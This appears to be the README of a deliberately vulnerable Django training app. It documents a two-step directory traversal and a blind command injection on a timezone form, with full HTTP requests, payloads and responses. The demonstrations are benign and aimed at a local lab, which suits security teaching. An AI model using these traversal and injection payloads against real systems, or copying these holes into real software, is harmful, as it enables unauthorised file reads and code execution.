# h00die Cola

A demo django webapp which contains some vulnerabilities to exploit for nDepth security.

This was developed under Kali linux.

### Install
```
pip install Django==1.11
git clone https://github.com/h00die/ndepth_demo.git
python manage.py runserver 0:80
```
### Login

Login, as in the description, takes any username and password.  There are no user levels, all accounts are the same.

### Exploits

#### Directory Traversal

There is a directory traversal vulnerability on the config backup page.  However, there is a multi-step exploitation.

1. A request is made for the directory traversal file.  An Integer is returned
2. A request is made to download the the queued ID number

Since this is a multi-step process, vulnerability scanners were not able to identify it.

An example from BURP of executing code to exploit this vulnerability:

Step 1
```
POST /queue_download/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: XBRFohVHOJnnqvX4Y3nRg5QX10jSaa3eLwGGjJxvLl592NDi4GkzujAecMIDoQMM
Referer: http://127.0.0.1/config/
Content-Length: 53
Cookie: csrftoken=XBRFohVHOJnnqvX4Y3nRg5QX10jSaa3eLwGGjJxvLl592NDi4GkzujAecMIDoQMM; sessionid=p1ddjun257oqxdylvjp61ae44yl4vf3o
Connection: close

location=../../../../../../../../../../etc/os-release
```

Step 1 Response
```
HTTP/1.0 200 OK
Date: Sat, 03 Mar 2018 21:46:14 GMT
Server: WSGIServer/0.1 Python/2.7.14+
Vary: Cookie
X-Frame-Options: SAMEORIGIN
Content-Type: application/json
Content-Length: 2

15
```
Step 2
```
POST /download/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: XBRFohVHOJnnqvX4Y3nRg5QX10jSaa3eLwGGjJxvLl592NDi4GkzujAecMIDoQMM
Referer: http://127.0.0.1/config/
Content-Length: 5
Cookie: csrftoken=XBRFohVHOJnnqvX4Y3nRg5QX10jSaa3eLwGGjJxvLl592NDi4GkzujAecMIDoQMM; sessionid=p1ddjun257oqxdylvjp61ae44yl4vf3o
Connection: close

id=15
```

Step 2 Response
```
HTTP/1.0 200 OK
Date: Sat, 03 Mar 2018 21:46:17 GMT
Server: WSGIServer/0.1 Python/2.7.14+
Vary: Cookie
X-Frame-Options: SAMEORIGIN
Content-Type: text/plain
Content-Length: 246
Content-Disposition: attachment; filename='../../../../../../../../../../etc/os-release'

PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
ID=kali
VERSION="2018.1"
VERSION_ID="2018.1"
ID_LIKE=debian
ANSI_COLOR="1;31"
HOME_URL="http://www.kali.org/"
SUPPORT_URL="http://forums.kali.org/"
BUG_REPORT_URL="http://bugs.kali.org/"
```

#### Remote Code Execution

There is a remote code execution vulnerability on the timezone form.  However, it is blind (no results displayed) and limited to 36 characters.
Since this is a blind RCE, vulnerability scanners were not able to identify it.

An example from BURP of executing code to exploit this vulnerability:
```
POST /timezone/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/timezone/
Cookie: csrftoken=XBRFohVHOJnnqvX4Y3nRg5QX10jSaa3eLwGGjJxvLl592NDi4GkzujAecMIDoQMM; sessionid=p1ddjun257oqxdylvjp61ae44yl4vf3o
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 113

csrfmiddlewaretoken=lIqwLXlI2dGWLN0nJfciOGORDCVjt2lQ9DfxGpXwZPoIn5GBPS902Uy8Ook4HI4o&timezone=echo "hax" > /tmp/a
```
And the proof:
```
# cat /tmp/a
hax
```
